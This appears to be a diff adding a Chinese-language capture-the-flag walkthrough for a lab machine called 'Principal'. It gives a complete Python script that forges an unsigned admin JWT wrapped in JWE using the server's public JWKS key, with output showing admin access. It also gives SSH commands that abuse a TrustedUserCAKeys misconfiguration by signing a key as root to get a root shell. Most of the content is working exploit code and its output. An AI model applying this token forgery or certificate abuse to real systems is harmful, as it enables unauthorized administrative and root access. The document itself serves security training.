@@ -1,4 +1,144 @@
 ## Principal
+### 总结
+<details>
+<summary>jwt.py脚本</summary>
+
+```
+_____________________________________________________
+//1. 从 JWKS 端点提取 RSA 公钥
+//2. 使用管理员权限创建一个 PlainJWT 标签
+//3. 用服务器的公钥对它进行 JWE 加密包装
+//4. 测试并打印伪造的令牌
+_____________________________________________________
+[★]$ pip3 install jwcrypto
+_____________________________________________________
+[★]$ vi jwt.py
+#!/usr/bin/env python3
+
+import json
+import time 
+import base64
+import requests
+from jwcrypto import jwk, jwe
+import sys
+
+TARGET = sys.argv[1]
+
+print("[*] Fetching JWKS..")
+resp = requests.get(f"{TARGET}/api/auth/jwks")
+jwks_data = resp.json()
+key_data = jwks_data['keys'][0]
+pub_key = jwk.JWK(**key_data)
+print(f"[+] Got RSA public key (kid: {key_data['kid']})")
+
+def b64url_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+now = int (time.time())
+header = b64url_encode(json.dumps({"alg": "none"}).encode())
+payload = b64url_encode(json.dumps({
+    "sub": "admin",
+    "role": "ROLE_ADMIN",
+    "iss": "principal-platform",
+    "iat": now,
+    "exp": now + 3600
+}).encode())
+plain_jwt = f"{header}.{payload}."
+print(f"[+] Crafted PlainjWT with sub=admin, role=ROLE_ADMIN")
+
+jwe_token = jwe.JWE(
+        plain_jwt.encode(),
+        recipient=pub_key,
+        protected=json.dumps({
+            "alg": "RSA-OAEP-256",
+            "enc": "A128GCM",
+            "kid": key_data['kid'],
+            "cty": "JWT"
+        })
+)
+forged_token = jwe_token.serialize(compact=True)
+print(f"[+] Forged JWE token created")
+
+headers = {"Authorization": f"Bearer {forged_token}"}
+
+print("\n[*] Accessing /api/dashboard...")
+resp = requests.get(f"{TARGET}/api/dashboard",headers=headers)
+print(f"[+] Status: {resp.status_code}")
+data= resp.json()
+print(f"[+] Authenticated as: {data['user']['username']}({data['user']['role']})")
+
+print(f"[+] Token: {forged_token}")
+_____________________________________________________
+//获得在Session Storage的token 
+[★]$ python3 jwt.py http://10.129.244.220:8080
+[*] Fetching JWKS..
+[+] Got RSA public key (kid: enc-key-1)
+[+] Crafted PlainjWT with sub=admin, role=ROLE_ADMIN
+[+] Forged JWE token created
+
+[*] Accessing /api/dashboard...
+[+] Status: 200
+[+] Authenticated as: admin(ROLE_ADMIN)
+[+] Token:<SNIP>
+_____________________________________________________
+```
+</details>
+
+<details>
+<summary>TrustedUserCAKeys /opt/principal/ssh/ca.pub</summary>
+
+```
+_____________________________________________________
+svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-principal.conf
+# Principal machine SSH configuration
+PubkeyAuthentication yes
+PasswordAuthentication yes
+PermitRootLogin prohibit-password
+TrustedUserCAKeys /opt/principal/ssh/ca.pub
+
+在这里我们发现了一个严重的配置错误。已将 TrustedUserCAKeys 设置为有效，但并未配置 AuthorizedPrincipalsFile 或 AuthorizedPrincipalsCommand。
+
+当 OpenSSH 的 TrustedUserCAKeys 被配置但没有指定 AuthorizedPrincipalsFile 时：
+
+[1]任何由受信任的证书颁发机构签署的证书都会被接受
+
+[2]证书中列出的主体将与登录的用户名进行匹配
+_____________________________________________________
+svc-deploy@principal:~$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
+Generating public/private ed25519 key pair.
+Your identification has been saved in /tmp/pwn
+Your public key has been saved in /tmp/pwn.pub
+_____________________________________________________
+svc-deploy@principal:~$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
+Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from 2026-04-07T13:30:00 to 2026-04-07T14:31:07
+_____________________________________________________
+//认该证书的主体是否为根主体
+svc-deploy@principal:~$ ssh-keygen -L -f /tmp/pwn-cert.pub
+/tmp/pwn-cert.pub:
+        Type: ssh-ed25519-cert-v01@openssh.com user certificate
+        Public key: ED25519-CERT SHA256:4ZHS7I3JFC9WnTS4SvbJHo4KgiOD6f8JsYQzz06F4Fc
+        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
+        Key ID: "pwn-root"
+        Serial: 0
+        Valid: from 2026-04-07T13:30:00 to 2026-04-07T14:31:07
+        Principals: 
+                root
+        Critical Options: (none)
+        Extensions: 
+                permit-X11-forwarding
+                permit-agent-forwarding
+                permit-port-forwarding
+                permit-pty
+                permit-user-rc
+_____________________________________________________
+svc-deploy@principal:~$ ssh -i /tmp/pwn root@localhost
+root@principal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+_____________________________________________________
+```
+</details>
+
+### 扫描
 ```
  [★]$ nmap -sC  -sV 10.129.244.220
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-07 07:00 CDT
